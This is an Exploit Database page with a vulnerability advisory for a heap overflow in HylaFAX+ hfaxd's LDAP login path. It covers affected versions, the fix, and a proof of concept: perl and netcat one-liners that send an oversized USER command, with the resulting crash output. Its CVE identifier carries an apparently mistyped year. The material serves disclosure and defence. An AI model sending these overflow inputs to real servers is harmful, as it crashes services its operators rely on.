**Vulnerable App:**

```
Details
===========================================================
Application: "HylaFAX+"
Version: 5.2.4 (April, 2008) through 5.5.3 (August 6, 2013)
Type: Daemon that manages a fax server via an FTP-like protocol.
Vendor / Maintainer: Lee Howard (faxguy _at_ howardsilvan.com)
Project Homepage: http://hylafax.sourceforge.net/
Vulnerability: CWE-120: Classic buffer overflow from unchecked network
traffic, resulting in heap corruption.
Vulnerability Discoverer: Dennis Jenkins (dennis.jenkins.75 _at_ gmail.com)
CVE reference: CVE-2130-5680, 2013-09-03
Solution Status: Fixed by vendor.

Description
===========================================================
"HylaFAX™ is an enterprise-class open-source system for sending and
receiving facsimiles as well as for sending alpha-numeric pages."

Vulnerability
===========================================================
HylaFAX+ contains a daemon, "hfaxd", that allows a "fax client" to
communicate with the fax server to submit fax jobs, query status,
configure modems, etc...  The underlying wire protocol is a super-set
of classic FTP.  "hfaxd" can be compiled with support for
authenticating users via LDAP, although usually, one just configured
hfaxd to use PAM.  The code path for authenticating users via LDAP
allocates a 255-byte buffer (via the C++ "new" operator), and then
"strcats" user-supplied data buffered from the inbound FTP control
channel.  Other code limits the amount of copied data to 506 bytes,
and truncates on NULL and "\n".  Thus it is possible for an
UNAUTHENTICATED remote attacker to overflow the heap with a limited
character set.  At a minimum, this can crash or hang a hfaxd forked
client.  At this time, we have not attempted to construct an actual
exploit that leverages this security bug.

“hfaxd” typically runs as the “uucp” user, and forks on each new
connection.  The heap overflow occurs in a forked child.  Typically,
the child will simply hang.  We theorize (but have not tested) that an
attacker could consume system resources by abusing the heap overflow.
Although this has not been confirmed, the possibility that an attacker
may be able to execute arbitrary code in the "hfaxd" context can not
be ruled out.

It should be noted that the principle author of HylaFAX+, Lee Howard,
did not write the LDAP code - it was supplied by a third party.  After
I discovered the bug, Lee and I worked together to fix it, exchanging
code patches, performing peer-review and testing.  All use of "strcat"
was replaced with "snprintf".

For the vulnerability to be exposed, one must first compile
HylaFAX+with LDAP support, and then configure LDAP in "hfaxd.conf".
Simply compiling with LDAP support alone is insufficient to produce a
vulnerable system.

Lee and I suspect that the number of HylaFAX+ installations with LDAP
support configured are extremely low, if not zero.

This vulnerability does not exist in other versions of HylaFAX.
HylaFAX+ was forked from code at hylafax.org in 2005, 3 years before
the problematic LDAP code was added to HylaFAX+

Solution
===========================================================
1) Update to HylaFAX+ v5.5.4
   (http://hylafax.sourceforge.net/news/5.5.4.php) or later.
-OR-
2) Disable LDAP authentication (edit hfaxd.conf)

Proof-of-concept
===========================================================
1) Enable LDAP authentication on the hfaxd server.  Note, a valid LDAP
server need not exist.  Simply setting the “LDAPServerURI:” directive
in “/usr/local/lib/fax/hfaxd.conf” is sufficient.

# grep "^LDAPServerURI" /usr/local/lib/fax/hfaxd.conf
LDAPServerURI:   ldap://127.0.0.1:389

2) Start (or restart) the hfaxd process.  Run inside valgrind to see
the heap overwrite get caught.
# valgrind ./hfaxd/hfaxd -c /usr/local/lib/fax/hfaxd.conf -l
192.168.2.33 -q /var/spool/fax -i hylafax -d

3) Run this script from a client system.  NOTE: If testing on the same
server as the host, don’t connect to “localhost” / 127.0.0.1.  This
will not invoke LDAP (not sure why):

# # Test authentication without buffer overflow:
# perl -le 'print "USER ".("x"x10)."12345\nPASS test-ldap\nQUIT\n\n" '
| nc -q 5:5 192.168.2.33 4559
(seen on client)
nc: using stream socket
220 localhost server (HylaFAX (tm) Version 5.5.4) ready.
331 Password required for xxxxxxxxxx12345.
530 Bind LDAP error -1: Can't contact LDAP server
530 Login incorrect.

4) Test again, but increase the amount of data in the “USER” command
to overwrite the heap:

# perl -le 'print "USER ".("x"x500)."12345\nPASS test-ldap\nQUIT\n\n"
' | nc -q 5:5 192.168.2.33 4559
(client)
220 localhost server (HylaFAX (tm) Version 5.5.4) ready.
331 Password required for
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx12345.
(connection hangs until ‘nc’ times out)

(server)
Valgrind on the server will spew lots of diagnostics, ending with this:
--15348-- VALGRIND INTERNAL ERROR: Valgrind received a signal 11
(SIGSEGV) - exiting
--15348-- si_code=80;  Faulting address: 0x0;  sp: 0x402f3adf0

valgrind: the 'impossible' happened:
   Killed by fatal signal

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
